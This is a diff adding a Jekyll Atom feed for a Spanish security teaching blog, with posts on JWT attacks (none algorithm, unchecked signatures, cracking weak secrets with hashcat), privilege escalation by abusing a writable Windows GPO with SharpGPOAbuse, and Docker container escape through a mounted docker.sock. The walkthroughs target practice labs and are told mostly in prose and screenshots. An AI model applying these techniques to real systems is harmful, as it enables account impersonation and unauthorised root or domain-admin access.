@@ -1,0 +1,822 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://raul-profesor.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://raul-profesor.github.io/" rel="alternate" type="text/html" /><updated>2022-09-23T22:13:04+02:00</updated><id>https://raul-profesor.github.io/feed.xml</id><title type="html">Raúl Riesco</title><subtitle>Moonwalk is a fast and elegant Jekyll theme with a clean dark mode. It comes with horizontal list (for navbar and footer), card list (for portfolio), and a generic vertical list. It is very easy to modify in case you want to build over it - please see _layouts/home.html to do that.
+</subtitle><author><name>Raúl riesco</name></author><entry><title type="html">JSON Web Token (JWT)</title><link href="https://raul-profesor.github.io/jwt.html" rel="alternate" type="text/html" title="JSON Web Token (JWT)" /><published>2022-06-02T00:00:00+02:00</published><updated>2022-06-02T00:00:00+02:00</updated><id>https://raul-profesor.github.io/JWT</id><content type="html" xml:base="https://raul-profesor.github.io/jwt.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;h3 id=&quot;qué-es-json&quot;&gt;¿Qué es JSON?&lt;/h3&gt;
+&lt;p&gt;JSON es el acrónimo de JavaScript Object Notation y es un formato basado en texto para transmitir información entre aplicaciones web. Almacena la información de una forma tal que hace muy fácil el acceder a ella, tanto para desarrolladores como para las máquinas.&lt;/p&gt;
+
+&lt;p&gt;También puede ser usado como formato de datos por cualquier lenguaje de programación y de heco se está convirtiendo rápidamente en la sintaxis preferida para las APIs, superando a XML.&lt;/p&gt;
+
+&lt;h3 id=&quot;qué-es-un-json-web-token-jwt&quot;&gt;¿Qué es un JSON Web Token (JWT)?&lt;/h3&gt;
+
+&lt;p&gt;JWT es ya una técnica muy popular para securizar APIs, así como ha conseguido (y sigue haciéndolo) gran popularidad también en muchos CTF.&lt;/p&gt;
+
+&lt;p&gt;En esencia, JWT es un estándar abierto utiliziado para compartir información entre dos partes, cliente y servidor. Cada JWT incluye objetos JSON codificados. Los JWT se firman utilzando algoritmos criptográficos con el fin de asegurar que no han sido modificados una vez han sido emitidos.&lt;/p&gt;
+
+&lt;p&gt;Dos de sus grandes ventajas son:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Compactos:&lt;/strong&gt; debido a su tamaño, se pueden enviar en una URL, como un parámetro POST o dentro de una cabecera HTTP. Además, este reducido tamaño hace que la transmisión sea más rápida.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Autocontenidos:&lt;/strong&gt; el “payload” contiene toda la información que se necesita del usuario, evitando así consultar a la base de datos más de una vez.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;cuándo-usar-jwts&quot;&gt;¿Cuándo usar JWTs?&lt;/h3&gt;
+
+&lt;p&gt;Hay dos escenarios donde este tipo de token es útil:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Autenticación:&lt;/strong&gt; Es el escnario típico en el que se usan los JWTs. Una vez logueado, cada petición a partir de ese momento irá acompañada del JWT, permitiendo el acceso a las rutas, servicios y recursos que correspondan a ese token.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Intercambio de información:&lt;/strong&gt; Los JWTs son una buena forma de transmitir información de forma segura entre las partes porque estos tokens pueden firmarse, por ejemplo con claves pública/privada. Esto también permite aseugrar la integridad puesto que la firma se calcula usando la información del token, el header y el payload, que veremos a continuación.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;estructura-de-un-jwt&quot;&gt;Estructura de un JWT&lt;/h3&gt;
+
+&lt;p&gt;Un JWT está formado por tres partes separadas por un punto entre ellas. Estas partes se conocen como:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Header&lt;/li&gt;
+  &lt;li&gt;Payload&lt;/li&gt;
+  &lt;li&gt;Signature&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Por lo que el formato típico de un JWT sería: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxxxxxx.yyyyyyy.zzzzzzz&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/jwt/jwt-structure.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;header&quot;&gt;Header&lt;/h4&gt;
+&lt;p&gt;En header típicamente tiene dos partes: el tipo de token &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typ&lt;/code&gt; y el algoritmo de firma utilizado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alg&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Se pueden utilizar multitud de algoritmos pero los más conocidos son:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;HS256:&lt;/strong&gt; Simétrico, es decir, utiliza el mismo secret para firmar que para verificar. Más rápido ya que el procesado es más sencillo y el token resultante más pequeño.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;RS256:&lt;/strong&gt; Asimétrico (par de claves pública/privada). La clave privada se utiliza en el firmado y la pública para verificar la firma.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Por último, este JSON se codificada en formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64Url&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;payload&quot;&gt;Payload&lt;/h4&gt;
+&lt;p&gt;La segunda parte del token es el payload, que contiene los conocidos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;claims&lt;/code&gt;. Estos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;claims&lt;/code&gt; hacen referencia, por norma general, a datos del usuario y metadatos adicionales. Pueden ser de tres tipos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Reserved:&lt;/strong&gt; Son claims predefinidos, que si bien no son obligatorios, son bastante recomendados.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Public:&lt;/strong&gt; Se pueden definir a voluntad por aquellos que usen los JWTs. No obstante, para evitar colisiones, se deben definiar en la IANA JSON Web TOken Registry.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Private:&lt;/strong&gt; Son claims customizados creados con el fin de compartir información entre las partes que han acordado utilizarlos.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;El payload, como veíamos en la imagen de arriba, también se codifica en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64Url&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;signature&quot;&gt;Signature&lt;/h4&gt;
+
+&lt;p&gt;Para la firma, se utiliza la parte codificada del header, la parte codificada del payload, un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; y el algoritmo especificado en el header. Un ejemplo de esto en pseudocódigo sería:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HMACSHA256(
+  base64UrlEncode(header) + &quot;.&quot; +
+  base64UrlEncode(payload),
+  secret)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Atención&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Firmar el token asegura su integridad, es decir, nos certifica que la información que contiene no ha sido modificada. No obstante, este token está codificado, que no cifrado, por lo que cualquier información que contenga podrá ser visualizada sin problemas.&lt;/p&gt;
+
+&lt;p&gt;Para asegurar la confidencialidad de los datos, se recomienda utilizar cifrado, como por ejemplo HTTPS entre los participantes de la conversación.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;Vamos a ver algunos casos de mala utilización de los JWTs y de qué manera pueden ser “abusados”. Para ello vamos a utilizar &lt;a href=&quot;https://jwt-lab.herokuapp.com/challenges&quot;&gt;un estupendo laboratorio&lt;/a&gt; que alguien ha tenido a bien montar para que cualquiera pueda usarlo. En este laboratorio hay una serie de &lt;a href=&quot;https://jwt-lab.herokuapp.com/challenges&quot;&gt;challenges&lt;/a&gt; a realizar. Veamos algunos de ellos.&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerabilidad-none-algorithm-&quot;&gt;Vulnerabilidad “none algorithm “&lt;/h3&gt;
+
+&lt;p&gt;JWT permite utilizar para el claim &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alg&lt;/code&gt; el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;none&lt;/code&gt;. Es decir, si sustituimos el algoritmo de firma que se esté utilizando por el valor none y dejamos el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signature&lt;/code&gt; vacío, el token será considerado como correcto y podremos suplantar a otros usuarios.&lt;/p&gt;
+
+&lt;p&gt;Veamos cómo proceder.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;En primer lugar registraremos un nuevo usuario que será el que utilicemos para todas nuestras subsiguientes pruebas. Si accedemos al link: https://jwt-lab.herokuapp.com/users/new y rellenamos los datos, tendremos listo nuestro usuario:
+  &lt;img src=&quot;../img/jwt/jwt1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Tras ello, nos dirigimos a la URL para este challenge: https://jwt-lab.herokuapp.com/authentication/none y nos logueamos con el usuario que acabamos de crear
+&lt;img src=&quot;../img/jwt/jwt2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Si examinamos las peticiones y respuestas del proceso de login, veremos que tal y como dicta la teoría, tras realizarse el proceso de login, se genera y se devuelve un JWT al cliente:
+&lt;img src=&quot;../img/jwt/jwt3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Que es el que el cliente efectivamente utiliza a partir de ese momento en sus peticiones:
+   &lt;img src=&quot;../img/jwt/jwt4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Vamos a ver como sería este token decodificado. Envíamos la petición al &lt;em&gt;repeater&lt;/em&gt; de Burp y el token al plugin &lt;strong&gt;JSON Web Tokens&lt;/strong&gt;:
+&lt;img src=&quot;../img/jwt/jwt5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Y de esta forma podemos observar el algoritmo que se está utilizando para la firma en el Header y el nombre el usuario en el Payload, así como la firma en la parte del Signature.
+   &lt;img src=&quot;../img/jwt/jwt6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Si ahora, utilizando el plugin previamente mencionado, le decimos que vamos a realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Alg None attack&lt;/code&gt; y además, le decimos que vamos a suplantar al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, dejando además el campo Signature vacío:
+&lt;img src=&quot;../img/jwt/jwt7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Y reenviamos esta petición:
+&lt;img src=&quot;../img/jwt/jwt8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;Hemos conseguido convertirnos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, puesto que al admitirse el valor &lt;em&gt;none&lt;/em&gt; para &lt;em&gt;alg&lt;/em&gt;, este token se considera válido y nos identifica de forma correcta.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;no-se-comprueba-el-signature&quot;&gt;No se comprueba el “signature”&lt;/h2&gt;
+
+&lt;p&gt;Un gran fallo de seguridad al utilizar JWT es que no se comprueba el valor del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signature&lt;/code&gt; cuando se recibe en el servidor. Así pues, un usuario malintencionado podría utilizar un signature inválido y hacer pasar el token por válido para, de esta forma, suplantar a otro usuario.&lt;/p&gt;
+
+&lt;p&gt;Veamos cómo proceder:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Identificamos la petición inicial correcta, con la firma correspondiente y el usuario original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raul-jwt&lt;/code&gt;
+ &lt;img src=&quot;../img/jwt/jwt15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Si eliminamos la firma y le decimos que queremos suplantar la identidad del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, al no comprobarse la firma, tendremos éxito en nuestros maliciosas intenciones:
+   &lt;img src=&quot;../img/jwt/jwt16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;el-valor-del-signature-no-es-lo-suficientemente-robusto&quot;&gt;El valor del “signature” no es lo suficientemente robusto&lt;/h2&gt;
+&lt;p&gt;Si el valor utilizado para la firma no es lo suficientemente robusto, podría ser susceptible a ataques de fuerza bruta. Veamos la demostración:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;En primer lugar accedemos a la URL para este challenge: https://jwt-lab.herokuapp.com/authentication/signature y nos logueamos con nuestro usuario.
+&lt;img src=&quot;../img/jwt/jwt11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Volvemos a identificar el nuevo token:
+ &lt;img src=&quot;../img/jwt/jwt12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Con la ayuda de hashcat el diccionario rockyou.txt, crackeamos el valor del secreto utilizdo para generar la firma:
+ &lt;img src=&quot;../img/jwt/jwt13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Y comprobamos que haciendo uso de este valor crackeado podemos convertirnos en el usuario admin, recalculando el valor de la firma:
+ &lt;img src=&quot;../img/jwt/jwt14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Y, por si alguien estuviera interesado, existen algunos challenges más en el laboratorio, así como los &lt;a href=&quot;https://adamc95.medium.com/json-web-token-lab-guide-c402857fa44c&quot;&gt;walkthroughs&lt;/a&gt; correspondientes en la página del autor.&lt;/p&gt;
+
+&lt;h2 id=&quot;referencias&quot;&gt;Referencias:&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://sh3llcon.org/jwt-for-beginners/&quot;&gt;Shellcon&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://auth0.com/learn/json-web-tokens/&quot;&gt;Auth0&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.akana.com/blog/what-is-jwt&quot;&gt;Akana&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.miniorange.com/what-is-jwt-json-web-token-how-does-jwt-authentication-work/&quot;&gt;Miniorange&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://adamc95.medium.com/json-web-token-lab-guide-c402857fa44c&quot;&gt;Challenges walkthroughs&lt;/a&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Escalada de privilegio mediante abuso de GPO</title><link href="https://raul-profesor.github.io/gpo-abuse.html" rel="alternate" type="text/html" title="Escalada de privilegio mediante abuso de GPO" /><published>2022-05-03T00:00:00+02:00</published><updated>2022-05-03T00:00:00+02:00</updated><id>https://raul-profesor.github.io/GPO_Abuse</id><content type="html" xml:base="https://raul-profesor.github.io/gpo-abuse.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;Supongamos que hemos vulnerado una máquina Windows y que tenemos una shell de usuario raso.&lt;/p&gt;
+
+&lt;p&gt;Decididmos estudiar los posibles métodos de escalada de privilegios haciendo uso de &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound&quot;&gt;Bloodhound&lt;/a&gt; para enumerar el dominio, sus objetos y propiedades.&lt;/p&gt;
+
+&lt;p&gt;Descubrimos que existe una GPO que podemos modificar porque tenemos permiso de escritura sobre ella. Veremos como hacerlo para incluir a nuestro usuario en el grupo de administradores.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;Como ya hemos dicho, mediante el ingestor adecuado, obtenemos el zip con la información que importaremos en Bloodhound. Tras utilizar una query predefinida para obtener el camino más corto hacia el Domain Admin, obtenemos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/GPOAbuse/vulnnet0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es decir, la cuenta con la que hemos obtenido acceso a la máquina, &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enterprise-security&lt;/code&gt;&lt;/em&gt;, tiene permisos de escritura sobre la GPO &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-pol-vn&lt;/code&gt;&lt;/em&gt;, dentro del dominio &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnnet.local&lt;/code&gt;&lt;/em&gt;, que contiene al usuario &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;&lt;/em&gt; y al grupo &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Es decir, debemos hacer uso de esta GPO o “abusar” de ella mediante la herramienta adecuada. Para este cometido tentemos &lt;a href=&quot;https://github.com/FSecureLABS/SharpGPOAbuse&quot;&gt;SharpGPOAbuse&lt;/a&gt;. En teoría, es necesario compilar el código de esta aplicación para obtener el ejecutable:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpGPOAbuse has been built against .NET 3.5 and is compatible with Visual Studio 2017.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;No obstante, es posible encontrar alguna versión precompilada, como por ejemplo &lt;a href=&quot;https://github.com/byronkg/SharpGPOAbuse&quot;&gt;aquí&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;transferencia-de-sharpgpoabuseexe-a-la-máqjuina-víctima&quot;&gt;Transferencia de SharpGPOAbuse.exe a la máqjuina víctima&lt;/h3&gt;
+
+&lt;p&gt;Tras obtener nuestra shell inversa mediante cualquier método, procederemos a transmitir este ejecutable desde nuestra máquina atacante a nuestra máquina víctima.&lt;/p&gt;
+
+&lt;p&gt;Tras ello, se comprueba la información de la cuenta de usuario comprometida:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/GPOAbuse/vulnnet.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Notar que el usuario sólo pertenece al grupo de usuarios de dominio (Domain Users)&lt;/p&gt;
+
+&lt;h3 id=&quot;uso-y-sintaxis-de-sharpgpoabuseexe&quot;&gt;Uso y sintaxis de SharpGPOAbuse.exe&lt;/h3&gt;
+
+&lt;p&gt;Siguiendo la sintaxis que se nos indica en su github, hacemos uso de esta aplicación para añadir una nueva tarea al dominio, ejecutada por el administrador y que consiste en añadir el usuario omprometido al grupo de administradores mediante la GPO susceptible de ser abusada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/GPOAbuse/vulnnet2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;También forzamos la actualización de las políticas.&lt;/p&gt;
+
+&lt;p&gt;Y si comprobamos ahora la información de la cuenta de usuario, vemos que pertenecemos al grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators&lt;/code&gt;, ergo somos administradores del dominio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/GPOAbuse/vulnnet3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que podemos conectarnos de forma remota con este usuario y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; y comprobar que, efectivamente, nuestra cuenta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/GPOAbuse/vulnnet4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Escalada de privilegios en contenedores Docker (II)</title><link href="https://raul-profesor.github.io/docker-ii.html" rel="alternate" type="text/html" title="Escalada de privilegios en contenedores Docker (II)" /><published>2022-03-31T00:00:00+02:00</published><updated>2022-03-31T00:00:00+02:00</updated><id>https://raul-profesor.github.io/Docker-II</id><content type="html" xml:base="https://raul-profesor.github.io/docker-ii.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;Ya comentábamos en un post anterior que una de las precauciones que había que tener al utilizar contenedores Docker o de cualquier otro tipo, era a la hora de montar volúmenes.&lt;/p&gt;
+
+&lt;p&gt;En este caso veremos otra precacución a tener en cuenta, el hecho de montar el socket de Docker en el anfitrión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/socker.dock&lt;/code&gt; directamente en el contenedor.&lt;/p&gt;
+
+&lt;h3 id=&quot;qué-es-dockersock&quot;&gt;¿Qué es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.sock&lt;/code&gt;?&lt;/h3&gt;
+
+&lt;p&gt;Docker es un servicio que corre en la máquina anfitrión. Este servicio se comunica con los clientes mediante un socket. Dicho de otra forma, la linea de comandos de Docker (docker-cli) utiliza sockets para comunicarse con el demonio de Docker.&lt;/p&gt;
+
+&lt;p&gt;Así pues, el demonio de Docker (dockerd) escucha peticiones a través de la API de Docker y de esta forma maneja objetos Docker tales como imágenes, contenedores, redes y volúmenes.&lt;/p&gt;
+
+&lt;p&gt;Este demonio ( o Docker Engine en alguna literartura) soporta 3 tipos de sockets: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;. Por temas de seguridad, por defecto utiliza el tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Si quisiéramos poder hacer llamadas a la API a través de la red porque nuestro diseño así lo exige, utilizaríamos el socket de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp&lt;/code&gt; y es aquí cuando tendríamos un riesgo de seguridad. El propietario de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/docker.sock&lt;/code&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, por lo que si se tiene acceso a este socket desde el contenedor comprometiéndolo, al haberlo montado como volúmen, tenemos un riesgo potencial de que alguien tenga acceso root a nuestra máquina anfitrión, es decir, una escalada de privilegios escapando del contenedor.&lt;/p&gt;
+
+&lt;p&gt;Una prueba sencilla de que este socket está en funcionamiento podríamos realizarla corriendo un contenedor y luego consultando la información de dicho contenedor con curl:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta consulta a la API equivaldría a un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps -a&lt;/code&gt; en docker-cli:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/API1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;por-qué-querría-montar-el-socket-en-el-contenedor&quot;&gt;¿Por qué querría montar el socket en el contenedor?&lt;/h3&gt;
+
+&lt;p&gt;Cuando uno intenta documentarse sobre este asunto, lo que leerá el 90% de las ocasiones será &lt;strong&gt;¡¡No montes /docker/run/docker.sock en tu contenedor!!&lt;/strong&gt;. Sin duda una solución estupenda que elimina todo riesgo al respecto.&lt;/p&gt;
+
+&lt;p&gt;Ahora bien, podemos encontrarnos que se ha montado el socket en el contenedor por diversos motivos, como por ejemplo:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Los desarrolladores lo dejan montado para depurar sus aplicaciones leyendo los logs de dentro del contenedor&lt;/li&gt;
+  &lt;li&gt;Queremos que una aplicación como &lt;a href=&quot;https://onthedock.github.io/post/170429-portainer-para-gestionar-tus-contenedores-en-docker/&quot;&gt;Portainer&lt;/a&gt; pueda crear contenedores&lt;/li&gt;
+  &lt;li&gt;Queremos poder crear y lanzar contenedores desde dentro de otro contenedor. Un ejemplo sería un contenedor con un pipeline de Jenkins que construya y lance imágenes Docker&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;La idea subyacente para esta escalada de privilegios es bastante simple. Puesto que el contenedor que teóricamente hemos comprometido corre con el usuario root dentro del contenedor, que a su vez se corresponde con el usuario root del sistema anfitrión, podremos crear y correr un nuevo contenedor que monte como volumen el sistema raíz del anfitrión. Y esto nos llevaría al anterior caso que ya discutimos en el blog de escalada de privilegios en Docker, ya que tendríamos acceso por completo al sistema anfitrión.&lt;/p&gt;
+
+&lt;p&gt;Como una imagen vale más que mil palabras, vamos a ello. Creamos un contenedor con una imagen de Alpine que monte como volumen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/run/docker.sock&lt;/code&gt; y comprobamos que se ha montado bien:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y se nos ofrece información sobre los contenedores. Esta consulta es equivalente a realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps -a&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/contenedores1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro del contenedor comprometido, que está ejecutándose con el usuario root por defecto, descargamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-cli&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En nuestro sistema anfitrión hemos creado un simple archivo de texto para comprobar que conseguimos escapar desde el contenedor y acceder al sistema de archivos del anfitrión, así como modificarlo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Así pues, contando ya con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-cli&lt;/code&gt; en el contenedor, lanzamos un nuevo contenedor que monte como volumen el directorio raíz &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; del sistema en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owned&lt;/code&gt; del contenedor:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y vemos que hemos conseguido escapar del contendor hacia sl sistema de archivos del anfitrión y además con acceso root, puesto que el root del contenedor se mapea con un usuario que pertenece al grupo docker y que, por tanto, tiene privilegios de root como vismo en el anterior post.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/dockerII/alpine6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si por lo que fuera no pudiéramos instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-cli&lt;/code&gt; en el contenedor, podríamos realizar el mismo proceso mediante llamadas a la API usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;
+
